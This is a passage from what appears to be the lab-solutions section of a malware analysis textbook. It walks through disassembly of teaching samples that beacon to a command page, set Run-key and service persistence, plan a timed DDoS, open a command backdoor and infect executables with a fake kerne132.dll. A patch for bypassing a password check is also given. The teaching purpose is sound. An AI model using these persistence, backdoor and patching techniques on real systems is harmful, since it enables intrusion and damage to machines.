binary. This approach is particularly handy when analyzing large binaries.
[Word Count: 28]

Figure 5-4L: Graph of cross-references from sub_10004E79
[Word Count: 7]

Figure 5-6L: Cross-reference graph for DllMain with a recursive depth of 1
[Word Count: 12]

As referenced in question 14, there is a call to Sleep at 0x10001358, as 
shown in the following listing. Sleep takes one parameter—the number of 
milliseconds to sleep—and we see it pushed on the stack as EAX.
[Word Count: 37]

10001341         mov     eax, off_10019020
10001346         add     eax, 0Dh
10001349         push    eax     ; Str
1000134A         call    ds:atoi
10001350         imul    eax, 3E8h
10001356         pop     ecx
10001357         push    eax     ; dwMilliseconds
10001358         call    ds:Sleep
[Word Count: 31]

Working backward, it looks like EAX is multiplied by 0x3E8 (or 1000 in 
decimal), which tells us that the result of the call to atoi is multiplied by 1000 
to get the number of seconds to sleep. Again working backward, we also see
[Word Count: 43]

To answer question 17, we search for the in instruction by selecting 
SearchText and entering in (we could also select SearchSequence of 
Bytes and searching for ED, the opcode for the in instruction). If we check 
Find All Occurrences in the search dialog, either option will present a new 
window listing all matches. Scrolling through the results shows only one 
instance of the in instruction at 0x100061DB, as follows:
[Word Count: 69]

100061C7         mov     eax, 564D5868h ; "VMXh"
100061CC         mov     ebx, 0
100061D1         mov     ecx, 0Ah
100061D6         mov     edx, 5658h
100061DB         in      eax, dx
[Word Count: 22]

Table 5-1L: Applying Symbolic Constants for a Call to socket
[Word Count: 10]

Before symbolic constants
After symbolic constants
[Word Count: 6]

100016FB   push  6
100016FD   push  1
100016FF   push  2
10001701   call  ds:socket
[Word Count: 12]

100016FB   push  IPPROTO_TCP
100016FD   push  SOCK_STREAM
100016FF   push  AF_INET
10001701   call  ds:socket
[Word Count: 12]

for i in range(0x00,0x50):
     b = Byte(sea+i)
     decoded_byte = b ^ 0x55 
     PatchByte(sea+i,decoded_byte)
[Word Count: 14]

1.
The major code construct is an if statement located at 0x401000.
[Word Count: 12]

2.
printf is the subroutine located at 0x40105F.
[Word Count: 8]

3.
The program checks for an active Internet connection. If an active con-
nection is found, it prints “Success: Internet Connection.” If a connec-
tion is not found, it prints “Error 1.1: No Internet.” This program can be 
used by malware to check for a connection before attempting to connect 
to the Internet.
[Word Count: 53]

function at 0x401000, which appears to be a key function of interest because 
it is the only one called by main. Figure 6-1L shows a flow graph of this function.
[Word Count: 30]

Figure 6-1L: Disassembly flow graph of the function at 0x401000
[Word Count: 10]

sub_401000:
push    ebp
mov     ebp, esp
push    ecx
push    0             
push    0             
call    ds:InternetGetConnectedState
mov     [ebp+var_4], eax
cmp     [ebp+var_4], 0
jz      short loc_40102B
[Word Count: 23]

loc_40103A:
mov     esp, ebp
pop     ebp
retn
[Word Count: 7]

00401017:
push    offset aSuccessInterne ; "Success: Internet Connection\n"
call    printf
add     esp, 4
mov     eax, 1
jmp     short loc_40103A
[Word Count: 19]

loc_40102B:             
push    offset aError1_1NoInte; "Error 1.1: No Internet\n"
call    printf
add     esp, 4
xor     eax, eax
[Word Count: 16]

the string itself, we can deduce that the function is printf. Therefore, we 
rename the function to printf, so that it is marked as such throughout the 
code, as shown in Figure 6-1L. Once the printf function is called, we see that 
EAX is set to either 1 or 0 before the function returns. 
To summarize, this function checks for an active Internet connection, 
and then prints the result of its check, followed by returning a 1 if it is con-
nected and 0 if it is not. Malware often performs a similar check for a valid 
Internet connection.
[Word Count: 99]

1.
The first subroutine at 0x401000 is the same as in Lab 6-1. It’s an if state-
ment that checks for an active Internet connection.
[Word Count: 25]

2.
printf is the subroutine located at 0x40117F.
[Word Count: 8]

3.
The second function called from main is located at 0x401040. It down-
loads the web page located at: http://www.practicalmalwareanalysis.com/
cc.htm and parses an HTML comment from the beginning of the page.
[Word Count: 32]

4.
This subroutine uses a character array filled with data from the call to 
InternetReadFile. This array is compared one byte at a time to parse an 
HTML comment.
[Word Count: 29]

5.
There are two network-based indicators. The program uses the HTTP 
User-Agent Internet Explorer 7.5/pma and downloads the web page 
located at: http://www.practicalmalwareanalysis.com/cc.htm.
[Word Count: 23]

6.
First, the program checks for an active Internet connection. If none is 
found, the program terminates. Otherwise, the program attempts to 
download a web page using a unique User-Agent. This web page contains 
an embedded HTML comment starting with <!--. The next character is 
parsed from this comment and printed to the screen in the format 
“Success: Parsed command is X,” where X is the character parsed from 
the HTML comment. If successful, the program will sleep for 1 minute 
and then terminate.
[Word Count: 84]

We begin by performing basic static analysis on the binary. We see several 
new strings of interest, as shown in Listing 6-1L.
[Word Count: 22]

Error 2.3: Fail to get command
Error 2.2: Fail to ReadFile
Error 2.1: Fail to OpenUrl
http://www.practicalmalwareanalysis.com/cc.htm
Internet Explorer 7.5/pma
Success: Parsed command is %c
[Word Count: 25]

Listing 6-1L: Interesting new strings contained in Lab 6-2
[Word Count: 9]

The three error message strings that we see suggest that the program 
may open a web page and parse a command. We also notice a URL for an 
HTML web page, http://www.practicalmalwareanalysis.com/cc.htm. This domain 
can be used immediately as a network-based indicator.
These imports contain several new Windows API functions used for net-
working, as shown in Listing 6-2L.
[Word Count: 59]

InternetReadFile
InternetCloseHandle
InternetOpenUrlA
InternetOpenA
[Word Count: 4]

Listing 6-2L: Interesting new import functions contained in Lab 6-2
[Word Count: 10]

All of these functions are part of WinINet, a simple API for using HTTP 
over a network. They work as follows:
[Word Count: 21]


InternetOpenA is used to initialize the use of the WinINet library, and it 
sets the User-Agent used for HTTP communication.
[Word Count: 21]


InternetOpenUrlA is used to open a handle to a location specified by a com-
plete FTP or HTTP URL. (Programs use handles to access something 
that has been opened. We discuss handles in Chapter 7.)
[Word Count: 36]


InternetReadFile is used to read data from the handle opened by 
InternetOpenUrlA.
[Word Count: 13]


InternetCloseHandle is used to close the handles opened by these files.
[Word Count: 12]

Next, we perform dynamic analysis. We choose to listen on port 80 
because WinINet often uses HTTP and we saw a URL in the strings. If we 
set up Netcat to listen on port 80 and redirect the DNS accordingly, we will 
see a DNS query for www.practicalmalwareanalysis.com, after which the program 
requests a web page from the URL, as shown in Listing 6-3L. This tells us that 
this web page has some significance to the malware, but we won’t know what 
that is until we analyze the disassembly.
[Word Count: 89]

GET /cc.htm HTTP/1.1
User-Agent: Internet Explorer 7.5/pma
Host: www.practicalmalwareanalysis.com
[Word Count: 9]

Listing 6-3L: Netcat output when listening on port 80
[Word Count: 9]

Finally, we load the executable into IDA Pro. We begin our analysis with 
the main method since much of the other code is generated by the compiler. 
Looking at the disassembly for main, we notice that it calls the same method at 
0x401000 that we saw in Lab 6-1. However, two new calls (401040 and 40117F) 
in the main method were not in Lab 6-1.
[Word Count: 65]

00401070     call    ds:InternetOpenUrlA
00401076     mov     [ebp+hFile], eax
00401079     cmp     [ebp+hFile], 0  
...
0040109D     lea     edx, [ebp+dwNumberOfBytesRead]
004010A0     push    edx  ; lpdwNumberOfBytesRead
004010A1     push    200h ; dwNumberOfBytesToRead
004010A6     lea     eax, [ebp+Buffer ] 
004010AC     push    eax           ; lpBuffer
004010AD     mov     ecx, [ebp+hFile]
004010B0     push    ecx           ; hFile
004010B1     call    ds:InternetReadFile
004010B7     mov     [ebp+var_4], eax
004010BA     cmp     [ebp+var_4], 0 
004010BE     jnz     short loc_4010E5
[Word Count: 62]

Listing 6-4L: InternetOpenUrlA and InternetReadFile calls
[Word Count: 6]

Following the call to InternetReadFile, code at  checks to see if the return 
value (EAX) is 0. If it is 0, the function closes the handles and terminates; if 
not, the code immediately following this line compares Buffer one character 
at a time, as shown in Listing 6-5L. Notice that each time, the index into 
Buffer goes up by 1 before it is moved into a register, and then compared.
[Word Count: 71]

004010E5     movsx   ecx, byte ptr [ebp+Buffer]
004010EC     cmp     ecx, 3Ch 
004010EF     jnz     short loc_40111D
004010F1     movsx   edx, byte ptr [ebp+Buffer+1] 
004010F8     cmp     edx, 21h
004010FB     jnz     short loc_40111D
004010FD     movsx   eax, byte ptr [ebp+Buffer+2]
00401104     cmp     eax, 2Dh
00401107     jnz     short loc_40111D
00401109     movsx   ecx, byte ptr [ebp+Buffer+3]
00401110     cmp     ecx, 2Dh
00401113     jnz     short loc_40111D
00401115     mov     al, [ebp+var_20C] 
0040111B     jmp     short loc_40112C
[Word Count: 67]

Figure 6-2L: Creating an array and fixing the stack
[Word Count: 9]

1.
The functions at 0x401000 and 0x401040 are the same as those in Lab 6-2. 
At 0x401271 is printf. The 0x401130 function is new to this lab.
[Word Count: 27]

2.
The new function takes two parameters. The first is the command char-
acter parsed from the HTML comment, and the second is the program 
name argv[0], the standard main parameter.
[Word Count: 31]

3.
The new function contains a switch statement with a jump table.
[Word Count: 12]

4.
The new function can print error messages, delete a file, create a direc-
tory, set a registry value, copy a file, or sleep for 100 seconds.
[Word Count: 27]

5.
The registry key Software\Microsoft\Windows\CurrentVersion\Run\Malware 
and the file location C:\Temp\cc.exe can both be host-based indicators.
[Word Count: 15]

6.
The program first checks for an active Internet connection. If no Inter-
net connection is found, the program terminates. Otherwise, the pro-
gram will attempt to download a web page containing an embedded 
HTML comment beginning with <!--. The first character of the com-
ment is parsed and used in a switch statement to determine which action 
to take on the local system, including whether to delete a file, create a 
directory, set a registry run key, copy a file, or sleep for 100 seconds.
[Word Count: 86]

We begin by performing basic static analysis on the binary and find several 
new strings of interest, as shown in Listing 6-6L.
[Word Count: 22]

Error 3.2: Not a valid command provided
Error 3.1: Could not set Registry value
Malware
Software\Microsoft\Windows\CurrentVersion\Run
C:\Temp\cc.exe
C:\Temp
[Word Count: 18]

Listing 6-6L: Interesting new strings contained in Lab 6-3
[Word Count: 9]

These error messages suggest that the program may be able to modify 
the registry. Software\Microsoft\Windows\CurrentVersion\Run is a common auto-
run location in the registry. C:\Temp\cc.exe is a directory and filename that 
may be useful as a host-based indicator.
Looking at the imports, we see several new Windows API functions not 
found in Lab 6-2, as shown in Listing 6-7L.
[Word Count: 59]

DeleteFileA
CopyFileA
CreateDirectoryA
RegOpenKeyExA
RegSetValueExA
[Word Count: 5]

Listing 6-7L: Interesting new import functions contained in Lab 6-3
[Word Count: 10]

is 0x401040 (download web page and parse HTML comment). Therefore, 
var_8 is passed to 0x401130 containing the command character parsed from 
the HTML comment. 
Now that we know what is passed to the function at 0x401130, we can 
analyze it. Listing 6-8L is from the start of the function.
[Word Count: 49]

00401136     movsx eax, [ebp+arg_0]
0040113A     mov [ebp+var_8], eax
0040113D     mov ecx, [ebp+var_8] 
00401140     sub ecx, 61h
00401143     mov [ebp+var_8], ecx
00401146     cmp [ebp+var_8], 4 
0040114A     ja loc_4011E1
00401150     mov edx, [ebp+var_8]
00401153     jmp ds:off_4011F2[edx*4] 
...
004011F2 off_4011F2 dd offset loc_40115A 
004011F6          dd offset loc_40116C
004011FA          dd offset loc_40117F
004011FE          dd offset loc_40118C
00401202          dd offset loc_4011D4
[Word Count: 60]

Listing 6-8L: Analyzing the function at 0x401130
[Word Count: 7]

Graphical View of Command Character Switch
[Word Count: 6]

Now let’s look at the graphical view of this function, as shown in Figure 6-3L. 
We see six possible paths through the code, including five cases and the 
default. The “jump above 4” instruction takes us down the default path; 
otherwise, the jump table causes an execution path of the a through e 
branches. When you see a graph like the one in the figure (a single box 
going to many different boxes), you should suspect a switch statement. You 
can confirm that suspicion by looking at the code logic and jump table.
[Word Count: 93]

Figure 6-3L: The switch statement from function 0x401130 shown in graphical mode, 
labeled with the switch options
[Word Count: 17]

Next, we will examine each of the switch options (a through e) individually.
[Word Count: 13]


The a option calls CreateDirectory with the parameter C:\\Temp, to create 
the path if it doesn’t already exist.
[Word Count: 19]


The b option calls CopyFile, which takes two parameters: a source and 
a destination file. The destination is C:\\Temp\\cc.exe. The source is a 
parameter passed to this function, which, based on our earlier analysis, 
we know to be the program name (Argv[0]). Therefore, this option 
would copy Lab06-03.exe to C:\Temp\cc.exe.
[Word Count: 51]


The c option calls DeleteFile with the parameter C:\\Temp\\cc.exe, which 
deletes that file if it exists.
[Word Count: 17]


The d option sets a value in the Windows registry for persistence. Spe-
cifically, it sets Software\Microsoft\Windows\CurrentVersion\Run\Malware to 
C:\Temp\cc.exe, which makes the malware start at system boot (if it is first 
copied to the Temp location).
[Word Count: 37]


Finally, the default option prints “Error 3.2: Not a valid command 
provided.”
[Word Count: 13]

1.
The function at 0x401000 is the check Internet connection method, 
0x401040 is the parse HTML method, 0x4012B5 is printf, and 0x401150 
is the switch statement.
[Word Count: 26]

2.
A for loop has been added to the main method.
[Word Count: 11]

3.
The function at 0x401040 now takes a parameter and calls sprintf with 
the format string Internet Explorer 7.50/pma%d. It builds a User-Agent for 
use during HTTP communication using the argument passed in.
[Word Count: 33]

4.
This program will run for 1440 minutes (24 hours).
[Word Count: 10]

5.
Yes, a new User-Agent is used. It takes the form Internet Explorer 7.50/
pma%d, where %d is the number of minutes the program has been running.
[Word Count: 27]

We begin by performing basic static analysis on the binary. We see one new 
string of interest that was not in Lab 6-3, as follows:
[Word Count: 25]

00401248 loc_401248
00401248      mov [ebp+var_C], 0 
0040124F      jmp short loc_40125A
00401251 loc_401251:
00401251      mov eax, [ebp+var_C]
00401254      add eax, 1 
00401257      mov [ebp+var_C], eax
0040125A loc_40125A:
0040125A      cmp [ebp+var_C], 5A0h 
00401261      jge short loc_4012AF
00401263      mov ecx, [ebp+var_C] 
00401266      push ecx
00401267      call sub_401040
...
004012A2      push 60000
004012A7      call ds:Sleep
004012AD      jmp short loc_401251 
[Word Count: 60]

00401049       mov eax, [ebp+arg_0]
0040104C       push eax 
0040104D       push offset aInt ; "Internet Explorer 7.50/pma%d"
00401052       lea ecx, [ebp+szAgent]
00401055       push ecx         ; char *
00401056       call _sprintf
0040105B       add esp, 0Ch
0040105E       push 0           ; dwFlags
00401060       push 0           ; lpszProxyBypass
00401062       push 0           ; lpszProxy
00401064       push 0           ; dwAccessType
00401066       lea edx, [ebp+szAgent] 
00401069       push edx         ; lpszAgent
0040106A       call ds:InternetOpenA
[Word Count: 66]

1.
This program creates the service MalService to ensure that it runs every 
time the computer is started.
[Word Count: 18]

2.
The program uses a mutex to ensure that only one copy of the program 
is running at a time.
[Word Count: 20]

3.
We could search for a mutex named HGL345 and for the service MalService.
[Word Count: 14]

4.
The malware uses the user-agent Internet Explorer 8.0 and communi-
cates with www.malwareanalysisbook.com.
[Word Count: 14]

5.
This program waits until midnight on January 1, 2100, and then sends 
many requests to http://www.malwareanalysisbook.com/, presumably to con-
duct a distributed denial-of-service (DDoS) attack against the site.
[Word Count: 29]

6.
This program will never finish. It waits on a timer until the year 2100, 
and then creates 20 threads, each of which runs in an infinite loop.
[Word Count: 28]

The first step in analyzing this malware in depth is to open it with IDA Pro 
or a similar tool to examine the imported function list. Many functions in 
the list provide little information because they are commonly imported by
[Word Count: 40]

00401003  lea     eax, [esp+10h+ServiceStartTable]
00401007  mov     [esp+10h+ServiceStartTable.lpServiceName], offset aMalservice ; "MalService"
0040100F  push    eax             ; lpServiceStartTable
00401010  mov     [esp+14h+ServiceStartTable.lpServiceProc], offset sub_401040
00401018  mov     [esp+14h+var_8], 0
00401020  mov     [esp+14h+var_4], 0
00401028  call  ds:StartServiceCtrlDispatcherA
0040102E  push    0
00401030  push    0
00401032  call    sub_401040
[Word Count: 41]

00401040  sub     esp, 400h
00401046  push    offset Name     ; "HGL345"
0040104B  push    0               ; bInheritHandle
0040104D  push    1F0001h         ; dwDesiredAccess
00401052  call  ds:OpenMutexA
00401058  test    eax, eax
0040105A  jz      short loc_401064
0040105C  push    0               ; uExitCode
0040105E  call    ds:ExitProcess
[Word Count: 39]

The first function call is to OpenMutexA at . The only thing of note is that 
this call is attempting to obtain a handle to the named mutex HGL345 at . If 
the call succeeds, the program exits.
[Word Count: 38]

The next call is shown in the following listing.
[Word Count: 9]

00401064  push    esi
00401065  push    offset Name     ; "HGL345"
0040106A  push    0               ; bInitialOwner
0040106C  push    0               ; lpMutexAttributes
0040106E  call  ds:CreateMutexA
[Word Count: 22]

0040109A  push    0               ; lpPassword
0040109C  push    0               ; lpServiceStartName
0040109E  push    0               ; lpDependencies
004010A0  push    0               ; lpdwTagId
004010A2  lea     ecx, [esp+414h+BinaryPathName]
004010A6  push    0               ; lpLoadOrderGroup
004010A8  push ecx             ; lpBinaryPathName
004010A9  push    0               ; dwErrorControl
004010AB  push  2               ; dwStartType
004010AD  push  10h             ; dwServiceType
004010AF  push    2               ; dwDesiredAccess
004010B1  push    offset DisplayName ; "Malservice"
004010B6  push    offset DisplayName ; "Malservice"
004010BB  push    esi             ; hSCManager
004010BC  call    ds:CreateServiceA
[Word Count: 74]

The key CreateServiceA parameters are BinaryPathName at , dwStartType at , 
and dwServiceType at . The binary path to the executable is the same as the 
path to the currently running executable retrieved by the GetModuleFileName 
call. The GetModuleFileName call is needed because the malware may not know 
its directory or filename. By dynamically obtaining this information, it can 
install the service no matter which executable is called or where it is stored.
The MSDN documentation lists valid entries for the dwServiceType and 
dwStartType parameters. For dwStartType, the possibilities are SERVICE_BOOT_START 
(0x00), SERVICE_SYSTEM_START (0x01), SERVICE_AUTO_START (0x02), SERVICE_DEMAND_START
[Word Count: 97]

004010C2  xor     edx, edx
004010C4  lea     eax, [esp+404h+DueTime]
004010C8  mov     dword ptr [esp+404h+SystemTime.wYear], edx
004010CC  lea     ecx, [esp+404h+SystemTime]
004010D0  mov     dword ptr [esp+404h+SystemTime.wDayOfWeek], edx
004010D4  push    eax             ; lpFileTime
004010D5  mov     dword ptr [esp+408h+SystemTime.wHour], edx
004010D9  push    ecx             ; lpSystemTime
004010DA  mov     dword ptr [esp+40Ch+SystemTime.wSecond], edx
004010DE  mov
 [esp+40Ch+SystemTime.wYear], 834h
004010E5  call    ds:SystemTimeToFileTime
[Word Count: 53]

Next, the program calls CreateWaitableTimer, SetWaitableTimer, and 
WaitForSingleObject. The most important argument for our purposes is 
the lpDueTime argument to SetWaitableTimer. The argument is the FileTime 
returned by SystemTimeToFileTime, as shown in the preceding listing. The 
code then uses WaitForSingleObject to wait until January 1, 2100.
The code then loops 20 times, as shown in the following listing.
[Word Count: 58]

00401121  mov
 esi, 14h
00401126  push    0               ; lpThreadId
00401128  push    0               ; dwCreationFlags
0040112A  push    0               ; lpParameter
0040112C  push  offset StartAddress ; lpStartAddress
00401131  push    0               ; dwStackSize
00401133  push    0               ; lpThreadAttributes
00401135  call  edi ; CreateThread
00401137  dec
 esi
00401138  jnz
 short loc_401126
[Word Count: 47]

0040116D   push    0               ; dwContext
0040116F   push    80000000h       ; dwFlags
00401174   push    0               ; dwHeadersLength
00401176   push    0               ; lpszHeaders
00401178   push    offset szUrl    ; "http://www.malwareanalysisbook.com"
0040117D   push    esi             ; hInternet
0040117E call    edi ; InternetOpenUrlA
00401180 jmp     short loc_40116D
[Word Count: 40]

NOTE
If you ran this lab without a virtual machine, remove the malware by entering 
sc delete Malservice at the command line, and then deleting the file itself.
[Word Count: 28]

1.
This program does not achieve persistence. It runs once and then exits.
[Word Count: 13]

2.
The program displays an advertisement web page to the user.
[Word Count: 11]

3.
The program finishes executing after displaying the advertisement.
[Word Count: 9]

We begin with some basic static analysis. While we don’t see any 
interesting ASCII strings, we do see one interesting Unicode string: 
http://www.malwareanalysisbook.com/ad.html. We check the imports and
[Word Count: 28]

exports of the program, and see only a few imports in addition to the 
standard imports, as follows:
[Word Count: 18]

SysFreeString
SysAllocString
VariantInit
CoCreateInstance
OleInitialize
OleUninitialize
[Word Count: 6]

All of these functions are COM-related. The CoCreateInstance and 
OleInitialize functions in particular are required in order to use COM 
functionality.
Next, we try dynamic analysis. When we run this program, it opens Inter-
net Explorer and displays an advertisement. There’s no evidence of the pro-
gram modifying the system or installing itself to execute when the computer 
is restarted.
Now we can analyze the code in IDA Pro. We navigate to the _main 
method and see the code shown in the following listing.
[Word Count: 84]

00401003  push    0               ; pvReserved
00401005  call  ds:OleInitialize
0040100B  test    eax, eax
0040100D  jl      short loc_401085
0040100F  lea     eax, [esp+24h+(1) ppv]
00401013  push    eax             ; ppv
00401014  push    offset riid     ; riid
00401019  push    4               ; dwClsContext
0040101B  push    0               ; pUnkOuter
0040101D  push    offset rclsid   ; rclsid
00401022  call  ds:CoCreateInstance
00401028  mov     eax, [esp+24h+ppv]
[Word Count: 55]

0040105C  mov     eax, [esp+28h+ppv]
00401060   push    ecx
00401061   lea     ecx, [esp+2Ch+pvarg]
00401065  mov     edx, [eax]
00401067   push    ecx
00401068   lea     ecx, [esp+30h+pvarg]
0040106C   push    ecx
0040106D   lea     ecx, [esp+34h+var_10]
00401071   push    ecx
00401072   push    esi
00401073   push    eax
00401074 call    dword ptr [edx+2Ch]
[Word Count: 43]

1.
This program achieves persistence by writing a DLL to C:\Windows\
System32 and modifying every .exe file on the system to import that DLL.
[Word Count: 24]

2.
The program is hard-coded to use the filename kerne132.dll, which makes 
a good signature. (Note the use of the number 1 instead of the letter l.) 
The program uses a hard-coded mutex named SADFHUHF.
[Word Count: 35]

3.
The purpose of this program is to create a difficult-to-remove backdoor 
that connects to a remote host. The backdoor has two commands: one to 
execute a command and one to sleep.
[Word Count: 32]

4.
This program is very hard to remove because it infects every .exe file 
on the system. It’s probably best in this case to restore from backups. 
If restoring from backups is particularly difficult, you could leave the 
malicious kerne132.dll file and modify it to remove the malicious content. 
Alternatively, you could copy kernel32.dll and name it kerne132.dll, or 
write a program to undo all changes to the PE files.
[Word Count: 70]

First, we’ll look at Lab07-03.exe using basic static analysis techniques. When 
we run Strings on the executable, we get the usual invalid strings and the 
imported functions. We also get days of the week, months of the year, and 
other strings that are part of the library code, not part of the malicious 
executable.
The following listing shows that the code has several interesting strings.
[Word Count: 65]

kerne132.dll
.exe
WARNING_THIS_WILL_DESTROY_YOUR_MACHINE
C:\Windows\System32\Kernel32.dll
Lab07-03.dll
Kernel32.
C:\windows\system32\kerne132.dll
C:\*
[Word Count: 8]

The string kerne132.dll is clearly designed to look like kernel32.dll but 
replaces the l with a 1.
[Word Count: 17]

NOTE
For the remainder of this section, the imposter kerne132.dll will be in bold to make it 
easier to differentiate from kernel32.dll.
[Word Count: 22]

The string Lab07-03.dll tells us that the .exe may access the DLL for this 
lab in some way. The string WARNING_THIS_WILL_DESTROY_YOUR_MACHINE is interest-
ing, but it’s actually an artifact of the modifications made to this malware for 
this book. Normal malware would not contain this string, and we’ll see more 
about its usage in the malware later.
Next, we examine the imports for Lab07-03.exe. The most interesting of 
these are as follows:
[Word Count: 72]

CreateFileA
CreateFileMappingA
MapViewOfFile
IsBadReadPtr
UnmapViewOfFile
CloseHandle
FindFirstFileA
FindClose
FindNextFileA
CopyFileA
[Word Count: 10]

The imports CreateFileA, CreateFileMappingA, and MapViewOfFile tell us 
that this program probably opens a file and maps it into memory. The 
FindFirstFileA and FindNextFileA combination tells us that the program 
probably searches directories and uses CopyFileA to copy files that it finds. 
The fact that the program does not import Lab07-03.dll (or use any of the 
functions from the DLL), LoadLibrary, or GetProcAddress suggests that it 
probably doesn’t load that DLL at runtime. This behavior is suspect and 
something we need to examine as part of our analysis.
[Word Count: 88]

Next, we check the DLL for any interesting strings and imports and find 
a few strings worth investigating, as follows:
[Word Count: 20]

When looking at the DLL in IDA Pro, we see no exports, but we do see an 
entry point. We should navigate to DLLMain, which is automatically labeled by 
IDA Pro. Unlike the prior two labs, the DLL has a lot of code, and it would 
take a really long time to go through each instruction. Instead, we use a sim-
ple trick and look only at call instructions, ignoring all other instructions. 
This can help you get a quick view of the DLL’s functionality. Let’s see what 
the code would look like with only the relevant call instructions.
[Word Count: 99]

10001015  call    __alloca_probe
10001059  call    ds:OpenMutexA
1000106E  call    ds:CreateMutexA
1000107E  call    ds:WSAStartup
10001092  call    ds:socket
100010AF  call    ds:inet_addr
100010BB  call    ds:htons
100010CE  call    ds:connect
10001101  call    ds:send
10001113  call    ds:shutdown
10001132  call    ds:recv
1000114B  call    ebp ; strncmp
[Word Count: 38]

10001159  call    ds:Sleep
10001170  call    ebp ; strncmp
100011AF  call    ebx ; CreateProcessA
100011C5  call    ds:Sleep
[Word Count: 16]

100010F3  push    0               ; flags
100010F5  repne scasb
100010F7  not     ecx
100010F9  dec     ecx
100010FA  push    ecx             ; len
100010FB  push    offset buf 
; "hello"
10001100  push    esi             ; s
10001101  call    ds:send
[Word Count: 33]

As you can see at , the buf argument stores the data to be sent over the 
network, and IDA Pro recognizes that the pointer to buf represents the string 
"hello" and labels it as such. This appears to be a greeting that the victim 
machine sends to let the server know that it’s ready for a command.
Next, we can see what data the program is expecting in response, as 
follows:
[Word Count: 72]

10001124  lea 
eax, [esp+120Ch+buf]
1000112B  push    1000h           ; len
10001130  push    eax             ; buf
10001131  push    esi             ; s
10001132  call  ds:recv
[Word Count: 22]

If we go to the call to recv , we see that the buffer on the stack has been 
labeled by IDA Pro at . Notice that the instruction that first accesses buf is 
an lea instruction at . The instruction doesn’t dereference the value stored
[Word Count: 46]

at that location, but instead only obtains a pointer to that location. The call 
to recv will store the incoming network traffic on the stack.
Now we must determine what the program is doing with the response. 
We see the buffer value checked a few lines later at , as shown in the follow-
ing listing.
[Word Count: 56]

1000113C lea     ecx, [esp+1208h+buf]
10001143   push    5               ; size_t
10001145   push    ecx             ; char *
10001146   push    offset aSleep   ; "sleep"
1000114B call    ebp ; strncmp
1000114D   add     esp, 0Ch
10001150 test    eax, eax
10001152   jnz     short loc_10001161
10001154   push    60000h          ; dwMilliseconds
10001159   call    ds:Sleep
[Word Count: 46]

100011A5   push    0               ; lpApplicationName
100011A7   mov     [esp+1230h+StartupInfo.cb], 44h
100011AF call    ebx ; CreateProcessA
[Word Count: 14]

10001010 ; BOOL __stdcall DllMain(...)
10001010 _DllMain@12     proc near
10001010
10001010 hObject         = dword ptr -11F8h
10001010 name            = sockaddr ptr -11F4h
10001010 ProcessInformation=_PROCESS_INFORMATION ptr -11E4h
10001010 StartupInfo     = _STARTUPINFOA ptr -11D4h
10001010 WSAData         = WSAData ptr -1190h
10001010 buf             =  byte ptr -1000h
10001010 CommandLine     =  byte ptr -0FFBh
10001010 arg_4           = dword ptr  8
[Word Count: 58]

port 80. There’s still the mystery of why this DLL has no exported functions 
and how this DLL is run, and the content of the DLL offers no explanations, 
so we’ll need to defer those questions until later.
[Word Count: 38]

Next, we navigate to the main method in the executable. One of the first 
things we see is a check for the command-line arguments, as shown in the 
following listing.
[Word Count: 30]

We’ve learned that this program exits immediately unless the correct 
parameters are specified on the command line. The correct usage of this 
program is as follows:
[Word Count: 26]

Lab07-03.exe WARNING_THIS_WILL_DESTROY_YOUR_MACHINE
[Word Count: 2]

NOTE
Malware that has different behavior or requires command-line arguments is realistic, 
although this message is not. The arguments required by malware will normally be more 
cryptic. We chose to use this argument to ensure that you won’t accidentally run this on 
an important machine, because it can damage your computer and is difficult to remove.
[Word Count: 56]

00401806  push    offset aC       ; "C:\\*"
0040180B  call    sub_4011E0
[Word Count: 9]

004013F6
 call    ds:_stricmp
004013FC                 add     esp, 0Ch
004013FF                 test    eax, eax
00401401                 jnz     short loc_40140C
00401403                 push    ebp             ; lpFileName
00401404
 call    sub_4010A0
[Word Count: 23]

modified. Again, we’ll just move quickly through this function and use 
dynamic analysis to see what changes are made to the file.
Continuing to review the function, we see more arithmetic calls to 
IsBadPtr, which verify that the pointer is valid. Then we see a call to stricmp 
as shown at  in the following listing.
[Word Count: 56]

0040116E   push    offset aKernel32_dll ; "kernel32.dll"
00401173 push    ebx             ; char *
00401174 call    ds:_stricmp
0040117A   add     esp, 8
0040117D   test    eax, eax
0040117F   jnz     short loc_4011A7
00401181   mov     edi, ebx
00401183   or      ecx, 0FFFFFFFFh
00401186 repne scasb
00401188   not     ecx
0040118A   mov     eax, ecx
0040118C   mov     esi, offset dword_403010
00401191 mov     edi, ebx
00401193   shr     ecx, 2
00401196 rep movsd
00401198   mov     ecx, eax
0040119A   and     ecx, 3
0040119D   rep movsb
[Word Count: 72]

00403010 dword_403010    dd 6E72656Bh            ; DATA XREF: 
00403014 dword_403014    dd 32333165h            ; DATA XREF: _main+1B9r
00403018 dword_403018    dd 6C6C642Eh            ; DATA XREF: _main+1C2r
0040301C dword_40301C    dd 0                    ; DATA XREF: _main+1CBr
[Word Count: 31]

You should recognize that hex values beginning with 3, 4, 5, 6, or 7 are 
ASCII characters. IDA Pro has mislabeled our data. If we put the cursor on 
the same line as dword_403010 and press the A key on the keyboard, it will con-
vert the data into the string kerne132.dll.
[Word Count: 52]

1.
You can get the program to install itself by providing it with the -in 
option, along with the password. Alternatively, you can patch the binary 
to skip the password verification check.
[Word Count: 32]

2.
The command-line options for the program are one of four values and 
the password. The password is the string abcd and is required for all 
actions except the default behavior. The -in option instructs the malware 
to install itself. The -re option instructs the malware to remove itself. The 
-c option instructs the malware to update its configuration, including its 
beacon IP address. The -cc option instructs the malware to print its cur-
rent configuration to the console. By default, this malware functions as a 
backdoor if installed.
[Word Count: 89]

3.
You can patch the binary by changing the first bytes of the function at 
address 0x402510 to always return true. The assembly instruction for this 
behavior is MOV EAX, 0x1; RETN;, which corresponds to the byte sequence 
B8 01 00 00 00 C3.
[Word Count: 44]

4.
The malware creates the registry key HKLM\Software\Microsoft \XPS\
Configuration (note the trailing space after Microsoft). The malware also 
creates the service XYZ Manager Service, where XYZ can be a parameter 
provided at install time or the name of the malware executable. Finally, 
when the malware copies itself into the Windows System directory, it may 
change the filename to match the service name.
[Word Count: 63]

6.
By default, the malware beacons http://www.practicalmalwareanalysis.com/; 
however, this is configurable. The beacons are HTTP/1.0 GET requests 
for resources in the form xxxx/xxxx.xxx, where x is a random alphanumeric 
ASCII character. The malware does not provide any HTTP headers with 
its requests.
[Word Count: 42]

We start by debugging the malware with OllyDbg. We use the F8 key to step-
over until we arrive at the address 0x403945, which is the call to the main func-
tion. (The easiest way to figure out that the main function starts at 0x402AF0
[Word Count: 45]

Figure 9-1L: The malware prepares to delete itself, as seen 
in the string pointer to EDX
[Word Count: 16]

